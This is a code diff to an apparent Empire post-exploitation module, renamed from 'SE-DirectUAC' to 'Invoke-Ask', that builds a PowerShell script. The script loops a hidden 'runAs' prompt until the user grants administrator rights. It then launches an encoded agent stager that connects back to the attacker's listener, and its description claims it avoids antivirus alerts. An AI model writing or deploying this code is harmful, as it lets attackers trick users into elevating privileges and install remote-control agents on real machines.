@@ -5,14 +5,14 @@ class Module:
     def __init__(self, mainMenu, params=[]):
 
         self.info = {   
-            'Name': 'SE-DirectUAC',
-				
+            'Name': 'Invoke-Ask',
+                
             'Author': ['Jack64'],
-			    							  
-            'Description': ("Leverages Start-Process' -Verb runAs option inside a"				 
-			    " YES-Required loop to prompt the user for a high integrity context before running the agent code."
-			    " UAC will report Powershell is requesting Administrator privileges."
-			    " Because this does not use the BypassUAC DLLs, it should not trigger any AV alerts."),
+                                              
+            'Description': ("Leverages Start-Process' -Verb runAs option inside a"               
+                            " YES-Required loop to prompt the user for a high integrity context before running the agent code."
+                            " UAC will report Powershell is requesting Administrator privileges."
+                            " Because this does not use the BypassUAC DLLs, it should not trigger any AV alerts."),
 
             'Background' : True,
 
@@ -20,12 +20,12 @@ class Module:
             
             'NeedsAdmin' : False,
 
-            'OpsecSafe' : True,
+            'OpsecSafe' : False,
             
             'MinPSVersion' : '2',
             
             'Comments': [
-                'Achieve SYSTEM privileges via Social Engineering.'
+                'https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/local/ask.rb'
             ]
         }
 
@@ -88,19 +88,27 @@ class Module:
         else:
             # generate the PowerShell one-liner with all of the proper options set
             launcher = self.mainMenu.stagers.generate_launcher(listenerName, encode=True, userAgent=userAgent, proxy=proxy, proxyCreds=proxyCreds)
+
             if launcher == "":
                 print helpers.color("[!] Error in launcher generation.")
                 return ""
-            else:			
-		attackCode = '''
-$k=0
-while ($k -eq 0){
-	try {						      
-		Start-Process "powershell" -ArgumentList "'''+launcher[14:]+'''" -Verb runAs -WindowStyle hidden
-		$k=1
-	}
-	catch {
-	}
+            else:
+                encLauncher = " ".join(launcher.split(" ")[1:])
+
+                script = '''
+if( ($(whoami /groups) -like "*S-1-5-32-544*").length -eq 1) {
+    while($True) {
+        try {
+            Start-Process "powershell" -ArgumentList "%s" -Verb runAs -WindowStyle hidden
+            "[*] Successfully elevated!"
+            break
+        }
+        catch {}
+    }
 }
-		'''
-                return attackCode
+else  {
+    "[!] User is not a local administrator!"
+}
+''' %(encLauncher)
+
+                return script
